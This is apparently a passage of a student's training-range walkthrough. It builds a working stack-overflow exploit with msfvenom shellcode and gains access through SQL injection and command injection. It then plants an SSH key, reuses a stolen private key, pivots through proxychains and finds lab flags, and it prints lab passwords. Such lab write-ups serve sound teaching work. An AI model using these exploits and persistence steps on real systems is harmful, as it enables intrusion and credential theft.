+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd230 ('A' <repeats 92 times>, "\n")
+0004| 0xffffd234 ('A' <repeats 88 times>, "\n")
+0008| 0xffffd238 ('A' <repeats 84 times>, "\n")
+0012| 0xffffd23c ('A' <repeats 80 times>, "\n")
+0016| 0xffffd240 ('A' <repeats 76 times>, "\n")
+0020| 0xffffd244 ('A' <repeats 72 times>, "\n")
+0024| 0xffffd248 ('A' <repeats 68 times>, "\n")
+0028| 0xffffd24c ('A' <repeats 64 times>, "\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+```
+Use this website https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to create a pattern to identify how far the EIP is in the stack.
+
+<img width="1380" height="490" alt="{C35B1776-4F94-4B01-AD8B-CFD91147D6A4}" src="https://github.com/user-attachments/assets/15b1b9dc-8304-409a-8e71-8395815bee64" />
+
+Take the pattern generated here and CRASH the program in `gdb`.
+```
+Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+```
+Output:
+<img width="912" height="740" alt="{B11B1965-DE40-4DAC-B4F1-4C4F9340365E}" src="https://github.com/user-attachments/assets/011009ee-eaa7-45b6-a42c-136a252f453a" />
+
+*EIP*: **0x63413563** ('c5Ac')
+
+Part of our pattern landed in the EIP. Let's plug it back into the website to figure out it's offset. If you recall the picure we had of the website, I had already plugged it in. The offset is **76**. 
+Let's now create a script and see if we can land in the EIP with control. We do this so we can control where it's next point of *instruction* will be. There, that's were our malicious code will be.
+Here's the script to run in `gdb`:
+```
+run <<< $(python -c 'print "A" * 76 + "B" * 4')
+```
+<img width="915" height="682" alt="{63E06992-F2B1-470D-A26C-B89D69ED9D4D}" src="https://github.com/user-attachments/assets/b7e53d92-cf4d-4173-9818-a44e1ae8095e" />
+
+Here, we can see that our EIP = 'BBBB'. This means we can now control the EIP and use *our* POINTER!
+
+Let's start developing our script in a file we will call `miscript.py`:
+```
+buff = 'A' * 76
+eip = "BBBB"
+print(buff + eip)
+```
+Now let's go test it out in `gdb`:
+```
+run <<< $(python miscript.py)
+  - If you aren't in the correct directory, you will have to do an "absolute path" to it.
+```
+Now that we see our script works, our next step is to identify the *"jmp esp"* We do this by going to a clean *env*, then **crash** the program there.
+```
+(1) env - gdb inventory.exe
+
+(2) run
+  (3) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+```
+Output: 
+<img width="905" height="652" alt="{636569D9-44C3-4740-B2B0-D0C3DFC6C5ED}" src="https://github.com/user-attachments/assets/29b88ab8-684d-4dae-a17e-06ead53d72c3" />
+
+Let's take a handful of the address that have the file path of `/lib32/libc-2.27.so`.
+```
+0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
+	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
+```
+Plug in this command in `gdb` to find the *jmp esp* address:
+```
+***in GDB***
+
+find /b 0xf7de1000, 0xf7fb3000, 0xff, 0xe4
+```
+Results:
+```
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+0xf7f64aff
+0xf7f64d6f
+0xf7f64f97
+0xf7f650cf
+0xf7f65343
+```
+
+We will try these one at a time. Convert one of these addresses into ***little-endian***. 
+```
+example:
+
+0Xf7\de\3b\59 --> \x59\x3b\xde\xf7  <-- Make sure to include "x" in your little-endian conversion
+```
+Plug in the *little-endian* to our script.
+```
+buff = 'A' * 76
+#eip = "BBBB"
+eip = "\x59\x3b\xde\xf7"
+nop = '\x90' * 5 <---- Normally you would see how much space you have in the overflow 
+print(buff + eip)
+```
+### Shellcode
+What we are trying to do is access this file. We will use `cat /.secret/.verysecret.pdb`
+```
+msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
+```
+Here are the results of that command! Now let's copy it to add to our script.
+```
+buf =  b""
+buf += b"\xbf\xc4\xfd\x05\x2f\xdb\xd8\xd9\x74\x24\xf4\x5e"
+buf += b"\x29\xc9\xb1\x11\x31\x7e\x12\x83\xc6\x04\x03\xba"
+buf += b"\xf3\xe7\xda\x28\x07\xb0\xbd\xfe\x71\x28\x93\x9d"
+buf += b"\xf4\x4f\x83\x4e\x74\xf8\x54\xf8\x55\x9a\x3d\x96"
+buf += b"\x20\xb9\xec\x8e\x2e\x3e\x11\x4e\x32\x5f\x65\x6e"
+buf += b"\x9b\xb1\xf6\x0b\x80\xbf\x9d\xa7\x69\x6e\x28\x22"
+buf += b"\x04\x17\xa7\xc9\x8b\x95\x22\x65\x62\x2a\xc9\xe7"
+buf += b"\x7a\x9d\x42\x6e\x9b\xec\xe5"
+```
+**NOTE**: May need regenerate your payload for it to work.
+
+## Correction:
+
+We need to connect `192.168.28.111`. Thankfully, we are given the credentials in the beginning. 
+```
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+```
+Let's create our master socket tunnels:
+```
+lin_ops: ssh -MS /tmp/jump student@10.50.13.34	<--- BznOvkLSfBHB
+
+lin_ops(1): ssh -S /tmp/jump -O forward -L 21140:192.168.28.111:2222
+lin_ops(1): ssh -p21140 comrade@127.0.0.1 <--- StudentWebExploitPassword
+
+comrade@web:~$ whoami
+	> comrade
+```
+From here, let's go to *this* box's inventory by following the path in our "flag text". 
+```
+comrade@web: cd /.hidden
+```
+Results:
+```
+drwxr-xr-x  2 root root 4096 Jan 24  2022 .
+drwxr-xr-x 26 root root 4096 Nov 17 14:49 ..
+-rwxr-xr-x  1 root root 7352 Dec 30  2021 inventory.exe
+```
+Now let's use `gdb` on their `inventory.exe` and we will see the difference of the ***jmp esp***.
+```
+comrade@web: env - gdb inventory.exe
+
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env
+```
+Now that we are set in `gdb`, let's **run it and crash it**.
+```
+(gdb) run
+> Press enter to view inventory: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+	> Program received signal SIGSEGV, Segmentation fault.
+```
+Let's go into this boxes memory location:
+```
+(gdb) info proc map
+```
+Results:
+```
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /.hidden/inventory.exe
+	 0x8049000  0x804a000     0x1000        0x0 /.hidden/inventory.exe
+	 0x804a000  0x804b000     0x1000     0x1000 /.hidden/inventory.exe
+	 0x804b000  0x806d000    0x22000        0x0 [heap]
+-->	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so		<-- Notice the SUBTLE difference
+	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc4000 0xf7fc5000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fc5000 0xf7fc8000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+```
+***
+To bring the difference front and center, here they are:
+
+**lin_ops**: 	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so 
+
+**comrade@web**: 0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
+***
+Now, let's use this range to find our *jmp esp* addresses.
+```
+find /b 0xf7def000, 0xf7fc1000, 0xff, 0xe4 
+```
+Results:
+```
+0xf7df1b51  --> \x51\x1b\xdf\xf7
+0xf7f6674b
+0xf7f72753
+0xf7f72c6b
+0xf7f72df7
+```
+Let's go into our script and update the ***EIP*** section so that it will find our payload correctly:
+```
+buff = 'A' * 76
+#eip = "BBBB"
+eip = "\x51\x1b\xdf\xf7"
+nop = '\x90' * 5
+
+buf =  b""
+buf += b"\xbf\xc4\xfd\x05\x2f\xdb\xd8\xd9\x74\x24\xf4\x5e"
+buf += b"\x29\xc9\xb1\x11\x31\x7e\x12\x83\xc6\x04\x03\xba"
+buf += b"\xf3\xe7\xda\x28\x07\xb0\xbd\xfe\x71\x28\x93\x9d"
+buf += b"\xf4\x4f\x83\x4e\x74\xf8\x54\xf8\x55\x9a\x3d\x96"
+buf += b"\x20\xb9\xec\x8e\x2e\x3e\x11\x4e\x32\x5f\x65\x6e"
+buf += b"\x9b\xb1\xf6\x0b\x80\xbf\x9d\xa7\x69\x6e\x28\x22"
+buf += b"\x04\x17\xa7\xc9\x8b\x95\x22\x65\x62\x2a\xc9\xe7"
+buf += b"\x7a\x9d\x42\x6e\x9b\xec\xe5"
+
+print(buff + eip + nop + buf)
+```
+All we have to do now is upload our `miscript.py` to **comrade@web**. 
+```
+scp -P21140 /home/student/exdev/miscript.py comrade@127.0.0.1	<--- StudentWebExploitPassword
+```
+Now that it is on `comrade@web`, let's run the command in their normal terminal:
+```
+comrade@web: sudo ./inventory.exe <<< $(python ./miscript.py)
+```
+There is our flag!
+```
+Press enter to view inventory: Total Inventory:
+Bandages: 12
+Kvass: 1.000
+Turnips: 12.000
+5.45x39: 20.000
+AK-74M: 200
+Zastava Koral: 50
+BH0Awx6p094NDbWkpnnf	<-- Our flag!
+```
+  </details>
+</details>
+</details>
+
+<details>
+  <summary><h1>Post Exploitation</h1></summary>
+
+<details> 
+  <summary><h4>Intro</h4></summary>
+
+***
+Utilizing the intelligence provided, enumerate the target provided. Look for user generated documents relating to network structure on this host that will direct further actions.
+
+Your flag will be a unique string of twenty random characters.
+***
+#### Type of Operation:
+- Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)
+#### Objective:
+- Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace,
+  it is believed that there is an network that acts as an internal DMZ between these to locations.
+  Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.
+#### Tools/Techniques:
+- All connections will be established through SSH masquerades or web browser.
+  Ports in use will be dependent on target location and are subject to change.
+  Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized
+#### Prior Approvals:
+- Sudo usage and remote port forward is authorized.
+  System dir walks from system roots, altering accounts/routing or tool uploads are authorized.
+  Survey and access to newly discovered systems during C-ISR.
+
+### Scheme of Maneuver:
+```
+>Jump Box
+->T1: 192.168.28.100
+-->T3:x.x.x.9
+```
+## Target Section:
+```
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:Unknown
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+```
+```
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+```
+</details>
+
+<details>
+  <summary><h4>Post Exploitation</h4></summary>
+
+  <details>
+    <summary><h4>Post - Extranet</h4></summary>
+
+***
+The Donovian government is furthering their inventory expansion project. Identify and locate this intel to support this.
+
+Your flag will be a unique string of twenty random characters.
+> ***HINT***: This flag is base64 encoded
+***
+First, let's make our MS connection and enumerate *T1* (192.168.28.100).
+```
+ssh -MS /tmp/jump student@<JUMP>  // Pass: BznOvkLSfBHB
+ssh -S /tmp/jump -O forward -D 9050 2>/dev/null a@1
+proxychains nmap -p- -sT -T5 -Pn 192.168.28.100
+```
+Results:
+```
+Nmap scan report for 192.168.28.100
+Host is up (0.0014s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+```
+Let's confirm what services these open ports are giving.
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Since we don't have any credentials for their machine, let's use our MS tunnel and create a tunnel to their **HTTP** service.
+```
+ssh -S /tmp/jump -O forward -L 21180:192.168.28.100:80 a@1
+```
+After this, go to *Firefox* and connect to them by plugging this in the URL.
+```
+127.0.0.1:21180
+```
+Looks like the website is "Under maintenance."
+<img width="1014" height="508" alt="{3B16AB7E-6FB2-4358-AEB4-5827F6070D03}" src="https://github.com/user-attachments/assets/1273d3ac-acba-42d8-b779-02a10b80583a" />
+
+Next, let's grab as much info as we can through their HTTP port.
+```
+proxychains wget -r http://192.168.28.100  <-- Didn't give anything substaintial.
+```
+Wget didn't give anything. Let's us an Nmap script:
+```
+proxychains nmap -Pn -T5 -sT -p80 --script http-enum.nse 192.168.28.100
+```
+Results:
+```
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/login.php: Possible admin folder
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+```
+Looks like we found some potential "admin" folders! Let's try to access them via the URL.
+```
+http://127.0.0.1:21180/admin/login.php
+```
+Results:
+
+<img width="741" height="544" alt="{5813FB78-DBC3-4748-9890-5CDA32E362EE}" src="https://github.com/user-attachments/assets/d09f720b-37f1-463e-9de2-9c697432f59e" />
+
+Now let's test it's normal functions and then try to see if there is any SQL vulnerabilities.
+
+If you type in a wrong user/pass, it gives: `Username or Password is incorrect`
+Let's try testing out SQL injections. First, start by using this `' OR 1='1` for both *username* and *password*.
+
+SUCCESS! We are able to login and check their processes!
+
+<img width="737" height="208" alt="{2E446574-78F8-4FC7-A1CF-72CCEE7A1DE5}" src="https://github.com/user-attachments/assets/97c28747-9298-45cb-b812-2bf1e936ef98" />
+
+After sometime of plugging random commands. I've identified that it's a Linux machine by using `ps -elf`.
+
+To look at it more clearly, use this cmd: `ps -Nlf --ppid=2`. This will show all the processes with out the kernel processes.
+
+<img width="1110" height="759" alt="{CB292CEA-269E-42ED-9746-7E6C7CD2A5B1}" src="https://github.com/user-attachments/assets/057f6699-843c-4cc7-bc03-da6a4dd72702" />
+
+If we notice at the bottom, it shows this:
+```
+0 S www-data  55509  51003  0  80   0 -  1157 wait   15:46 ?        00:00:00 sh -c ps -Cps -Nlf --ppid=2
+```
+It's reading our commands. If we use `;`, we can start injecting our commands!
+
+Let's look for *.txt* files in their `/home` directory.
+```
+; find / -iname *txt* 2>/dev/null
+```
+Output:
+```
+/home/comrade/Dekstop/network/.mapkey.txt
+```
+There is our flag!
+```
+bFQQzHgYTuB5hglhfv3C
+```
+</details>
+<details>
+  <summary><h4>Post - Extranet 2</h4></summary>
+
+From what we learned in our first problem, let's look for search for key words using the `;` in the text box it gives us.
+
+Our question mentions key words like *inventory* and *project*. Let's search for these in their system:
+```
+; find / -iname *project* 2>/dev/null
+; find / -iname *inventory* 2>/dev/null
+```
+Result after searching for *inventory*:
+```
+/usr/share/doc/gawk/examples/data/inventory-shipped
+/usr/share/equip-inventory.txt
+```
+Let's open that *.txt* file:
+```
+; cat /usr/share/equip-inventory.txt
+```
+There's our flag! However, our hint said it's **encoded in base64**. Let's take that flag and decode it!
+```
+d3ZreG13QzRId1pIeTJoZWVzTTEK  <-- encoded in base64
+```
+Flag decoded:
+```
+wvkxmwC4HwZHy2heesM1
+```
+
+  </details>
+  <details>
+    <summary><h4>Post - Intranet</h4></summary>
+
+***
+Enumerate all network items, relating to local name resolution.
+
+Your flag will be a unique string of twenty random characters.
+***
+The title of this question is inferring that we need to gain access to their box via SSH (**2222**).
+
+Let's do this by creating an SSH key and placing it into their system.
+### ssh-keygen creation
+```
+1.) student@lin-ops: ssh-keygen -t rsa
+  - Creating key.
+  - Make sure to leave passphrase EMPTY.
+2.) student@lin-ops: cat ~/.ssh/id_rsa.pub | /home/student/.ssh/id_rsa.pub
+  - This views the key. MAKE SURE TO COPY THE ENTIRE KEY.
+```
+### ssh-key drop
+- Check who you are using `whoami`
+```
+www-data
+```
+If you have a way to do **Command Injections**, go there and check if they already have a `~/.ssh` file. If not, you can create one!
+
+Thankfully, we can do **Command Injections**.
+```
+; pwd
+  > /var/www
+; ls -la /var/www
+  > drwxrwxr-x  4 root     www-data 4096 Dec  2 18:19 .
+    drwxr-xr-x 14 root     root     4096 May  4  2023 ..
+    -rw-------  1 www-data www-data   67 Dec  2 18:19 .Xauthority
+    drwxr-xr-x  4 root     root     4096 May  4  2023 html
+
+; mkdir /var/www/.ssh
+
+; echo "<ssh-keygen_from_/id_rsa.pub>" >> /var/www/.ssh/authorized_keys
+```
+From there, we should be able to log in after creating a tunnel. Let's use our *MS* tunnel:
+```
+ssh -S /tmp/jump -O forward -L 21132:192.168.28.100:2222 a@1
+```
+After this, we should be able to connect to it using this command and the user that we added the `.ssh` to.
+```
+ssh -p21132 www-data@127.0.0.1
+```
+***NOTE***: You should have to put a password. If you do, something went WRONG!
+Result should look like this:
+
+<img width="575" height="340" alt="{B6DCC815-90AC-4585-9A3D-4FE3BF6EACAF}" src="https://github.com/user-attachments/assets/bd262f07-cb24-42c2-a8ea-7b3f38b35c37" />
+
+Now we can start traversing!
+
+Let's look in their `/etc/hosts` and see what connections they have using this command `; cat /etc/hosts`
+
+<img width="765" height="303" alt="{FFD15EED-50B4-4A6D-937D-A33D11D7CEA5}" src="https://github.com/user-attachments/assets/0506adec-5624-408a-bd03-6a8d64346395" />
+
+As we can see, there is a connection:
+```
+192.168.150.253 Donovian-Intranet
+```
+Let's create a proxychain tunnel and enumerate it's ports:
+```
+ssh -p21132 www-data@127.0.0.1 -D 9050 2>/dev/null
+  - MAKE SURE TO CANCEL ANY PROXYCHAINS.
+
+proxychains nmap -p- -sT -Pn -T5 192.168.150.253
+```
+Results:
+```
+PORT     STATE SERVICE
+80/tcp   open  http
+514/tcp  open  shell
+3201/tcp open  cpq-tasksmart
+```
+Let's double-check what the services are:
+  - Port: **514** was giving issues. Let's leave it out when we scan for the ports.
+```
+proxychains nmap -p80,3201 -sV -Pn -T5 192.168.150.253
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+3201/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+```
+Let's scan for the UDP portion of 514:
+```
+proxychains nmap -p514 -sU -T5 -Pn 192.168.150.253
+
+PORT    STATE         SERVICE VERSION
+514/udp open|filtered syslog
+```
+Now for the TCP/514:
+```
+proxychains nmap -p514 -sT -T5 -Pn 192.168.150.253
+
+PORT    STATE    SERVICE VERSION
+514/tcp filtered shell
+```
+Now that we've verified the versions, let's view the HTTP directories.
+```
+proxychains wget -r http://192.168.150.253
+```
+Nothing substantial. Let's use a script.
+```
+proxychains nmap -Pn -T5 -sT -p80 --script http-enum.nse 192.168.150.253
+```
+Nothing came back. Let's go through the other users. Going back to the command injection, let's see who else is on the system:
+```
+;ls /home
+
+  comrade
+  ubuntu
+```
+Check both home directories for `.ssh`.
+#### Comrade
+```
+; ls -la /home/comrade
+```
+Results:
+```
+total 28
+drwxr-xr-x 4 comrade comrade 4096 May  4  2023 .
+drwxr-xr-x 4 root    root    4096 May  4  2023 ..
+-rw-r--r-- 1 comrade comrade  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 comrade comrade 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 comrade comrade  807 Apr  4  2018 .profile
+drwxr-xr-x 2 comrade comrade 4096 May  4  2023 .ssh
+drwxr-xr-x 3 root    root    4096 May  4  2023 Dekstop
+```
+Nothing came of this.
+
+Next, lets check the `/tmp` folder while logged in with **www-data**.
+  - Apparently, looking in the `/tmp` folder is a common practice. It's a world-sharing folder. 
+```
+ls /tmp
+```
+Results:
+```
+backup.tar.gz
+systemd-private-20540b12447a4a2a95e4b12e1078777f-ModemManager.service-Qz89nO
+systemd-private-20540b12447a4a2a95e4b12e1078777f-apache2.service-6p5UdG
+systemd-private-20540b12447a4a2a95e4b12e1078777f-systemd-resolved.service-WZXWf0
+systemd-private-20540b12447a4a2a95e4b12e1078777f-systemd-timesyncd.service-yOqkBf
+vmware-root_666-2731021219
+```
+Check the `backup.tar.gz` for anything we can use. (1) Transfer the info to our system. (2) Unzip it.
+```
+(1) scp -P21132 www-data@127.0.0.1:/tmp/backup.tar.gz .
+(2) tar -xvf backup.tar.gz
+```
+Contents inside of `backup.tar.gz`
+```
+.ssh/
+.ssh/id_rsa
+.ssh/id_rsa.pub
+```
+If we `cat` into the *id_rsa.pub*. We see it belongs to a user name **comrade**.
+
+Now that we have **comrade's** info, (1) let's create a tunnel to it and (2) specify this private key to connect to it.
+```
+(1) ssh -p21132 www-data@127.0.0.1 -D 9050
+(2) proxychains ssh -p3201 -i /home/student/postex/.ssh/id_rsa comrade@192.168.150.253
+```
+After this, we should be logged into our guy **comrade**.
+
+<img width="691" height="267" alt="{81EDCCAB-E249-41D4-A3D0-4785FE0FF91C}" src="https://github.com/user-attachments/assets/4e4cb27c-f596-478e-a232-21ab8a88f76d" />
+
+After that, check out their `/etc/hosts` file.
+```
+less /etc/hosts/
+```
+Results:
+```
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.56.1   badguy
+#f1@g = W03E7JotyxUHNVQjihPm   <-- LEGGGGGOOOOO
+```
+   </details>
+  <details>
+    <summary><h4>Post - Intranet 2</h4></summary>
+
+***
+Enumerate all items related to syslog and rsyslog.
+
+Your flag will be a unique string of twenty random characters.
+***
+Now that we are using `comrade@lin`, let's start enumerating. 
+```
+comrade@lin: pwd
+> /home/comrade
+
+comrade@lin: ls -l
+> -rw-r--r-- 1 comrade comrade 31 May  4  2023 password.txt
+
+comrade@lin: cat password.txt
+> comrade::StudentMidwayPassword
+```
+Looks like we found his password! 
+### Comrade Credentials:
+```
+User: comrade
+Pass: StudentMidwayPassword
+```
+Start enumerating the any `syslog` and `rsyslog` by going to it's *conf* files:
+```
+find / -name "*log.conf" 2>/dev/null
+```
+Results:
+```
+/etc/rsyslog.conf
+/etc/apache2/conf-enabled/other-vhosts-access-log.conf
+/etc/apache2/conf-available/other-vhosts-access-log.conf
+```
+If we `more /etc/rsyslog.conf`, we see at the bottom of the file that it includes `/etc/rsyslog.d/*.conf`. Let's search that directory:
+```
+find /etc/rsyslog.d -name *.conf 2>/dev/null
+```
+Results:
+```
+/etc/rsyslog.d/20-ufw.conf
+/etc/rsyslog.d/50-default.conf
+/etc/rsyslog.d/21-cloudinit.conf
+```
+Let's check out `50-default.conf`. At the bottom is where we'll find our flag:
+```
+---BREAK---
+*.*         @@badguy:514
+#f1ag = 3195AgGvcn73CL1xuOD3
+```
+  </details>
+<details>
+  <summary><h4>Post - Intranet 3</h4></summary>
+
+***
+Enumerate user directories on the machine. Find artifacts of malicious intent. You might need higher privileges to enumerate all user directories...
+
+Your flag will be a unique string of twenty random characters.
+***
+In our last problem, we found *comrade's* password: `StudentMidwayPassword`
+
+Let's use *comrade's* credentials to utilize `sudo` privileges!
+
+First, let's try scanning the `/home`
+```
+comrade@lin: ls -Rla /home
+```
+It gives a info about `comrade` and `ubuntu`. However, nothing stood out except for:
+```
+.sudo_as_admin_successful
+```
+Let's go into `/etc/passwd` to verify where all of the user's **home** directories where created.
+
+When we do this, we see that ***root's*** home directory was created in `/bin/bash`. Let's investigate that.
+```
+sudo ls -Rla /root
+```
+<img width="697" height="836" alt="{574EFEE8-B935-44B0-8DE0-411FF195DD12}" src="https://github.com/user-attachments/assets/4c16d773-af47-45ec-bef7-f1c2530008b0" />
+
+There, we can see that there is one difference due to the time created.
+```
+-rwxr-xr-x 1 root root    72 Sep 12  2017 bashtn.sh
+-rw-r--r-- 1 root root   241 Nov 17 14:49 br.conf  <--- The OUTLIER
+-rwxr-xr-x 1 root root    24 Sep 12  2017 brbomb.sh
+```
+Let's `cat` into that file.
+```
+sudo cat /root/brootkit/brootkit-master/br.conf
+```
+There lies our flag:
+```
+#brootkit config file.
+#
+HIDE_PORT		8080,8899
+HIDE_FILE		br.conf,bashbd.sh,brootkit,.bdrc,brdaemon,wzt
+HIDE_PROC		bashbd,brootkit,pty.spawn,brdaemon
+REMOTE_HOST		192.168.215.128
+REMOTE_PORT		8080
+SLEEP_TIME		60
+
+#f1@G = V9rzX0wvT9XkQ75KJUYG
+```
+</details>
+<details>
+  <summary><h4>Post - Intranet 4</h4></summary>
+
+***
+Enumerate for security products that may be installed on the system. (i.e. antivirus, etc.)
+
+Your flag will be a unique string of twenty random characters.
+
+***HINT***: Research the top 10 antivirus programs for Linux.
+***
+Let's go into `/etc/` and search for different `*.conf` files.
+```
+ls -la | grep .conf
+```
+Results:
+```
+-rw-r--r--  1 root root       3028 Mar  4  2020 adduser.conf
+-rw-r--r--  1 root root       5898 Mar  4  2020 ca-certificates.conf
+-rw-r--r--  1 root root       2969 Feb 28  2018 debconf.conf
+-rw-r--r--  1 root root        604 Aug 13  2017 deluser.conf
+-rw-r--r--  1 root root        280 Jun 20  2014 fuse.conf
+-rw-r--r--  1 root root       2584 Feb  1  2018 gai.conf
+-rw-r--r--  1 root root       4861 Feb 22  2018 hdparm.conf
+-rw-r--r--  1 root root         92 Apr  9  2018 host.conf
+-rw-r--r--  1 root root        110 Mar  4  2020 kernel-img.conf
+-rw-r--r--  1 root root         34 Jan 27  2016 ld.so.conf
+drwxr-xr-x  2 root root       4096 Mar  4  2020 ld.so.conf.d
+-rw-r--r--  1 root root        191 Feb  7  2018 libaudit.conf
+-rw-r--r--  1 root root        703 Aug 21  2017 logrotate.conf
+-rw-r--r--  1 root root      14867 Oct 13  2016 ltrace.conf
+-rw-r--r--  1 root root       5174 Aug  4  2018 manpath.config
+-rw-r--r--  1 root root        812 Mar 24  2018 mke2fs.conf
+-rw-r--r--  1 root root        513 Mar  4  2020 nsswitch.conf
+-rw-r--r--  1 root root       6920 Sep 20  2018 overlayroot.conf
+-rw-r--r--  1 root root        112 Mar  4  2020 overlayroot.local.conf
+-rw-r--r--  1 root root        552 Apr  4  2018 pam.conf
+-rw-r--r--  1 root root          0 Mar  4  2020 popularity-contest.conf
+lrwxrwxrwx  1 root root         39 Mar  4  2020 resolv.conf -> ../run/systemd/resolve/stub-resolv.conf
+-rw-r--r--  1 root root      49202 Nov 17 14:49 rkhunter.conf
+-rw-r--r--  1 root root       1356 May  4  2023 rsyslog.conf
+-rw-r--r--  1 root root        138 Feb 14  2020 sos.conf
+-rw-r--r--  1 root root       2683 Jan 17  2018 sysctl.conf
+-rw-r--r--  1 root root       1260 Feb 26  2018 ucf.conf
+-rw-r--r--  1 root root        403 Mar  1  2018 updatedb.conf
+-rw-r--r--  1 root root       1523 Mar  6  2018 usb_modeswitch.conf
+```
+The best looking one is `resolv.conf`. Let's `cat` it:
+```
+#Fl@G = d8hkY64WfvfzIBHpMGrE
+```
+</details>
+<details>
+  <summary><h4>Post - Intranet 6</h4></summary>
+
+***
+Enumerate items that would be related to jobs and tasks that running on the host. You may need to use higher privileges.
+
+Your flag will be a unique string of twenty random characters.
+***
+Let's start by searching for "cron":
+```
+find / -name *cron 2>/dev/null
+```
+Results:
+```
+/etc/default/cron
+/etc/init.d/cron
+/etc/rc2.d/S01cron
+/etc/rc5.d/S01cron
+/etc/pam.d/cron
+/etc/rc3.d/S01cron
+/etc/rc4.d/S01cron
+/var/spool/cron
+/usr/src/linux-headers-4.15.0-88-generic/include/config/memstick/jmicron
+/usr/share/doc/python3-debian/examples/debfile/extract_cron
+/usr/share/doc/passwd/examples/passwd.expire.cron
+/usr/share/doc/cron
+/usr/share/doc/cron/README.anacron
+/usr/share/bug/cron
+/usr/sbin/cron
+```
+Let's `cat` into `/var/spool/cron`.
+
+Looks like that is a directory:
+```
+ls -la /var/spool/cron
+```
+At the bottom, we recieved *Permission Denied*. 
+
+<img width="681" height="212" alt="{8EDB8BDC-395F-4833-946A-127F37055501}" src="https://github.com/user-attachments/assets/a992bdab-0c69-41f5-9673-ff0ff3ce8576" />
+
+Let's add `sudo`.
+```
+sudo ls -Rla /var/spool/cron
+```
+Results:
+```
+ /var/spool/cron/crontabs:
+total 12
+drwx-wx--T 2 root crontab 4096 May  4  2023 .
+drwxr-xr-x 5 root root    4096 Mar  4  2020 ..
+-rw------- 1 root root      83 Nov 17 14:49 root
+```
+`Cat` into it.
+```
+cat /var/spool/cron/crontabs/root
+```
+There is our flag!
+```
+*/15 * * * *    /bin/bash echo '#Fl@g = HbxXpcZuQtLlFhxxakda' >> /var/log/auth.log
+```
+</details>
+ <details>
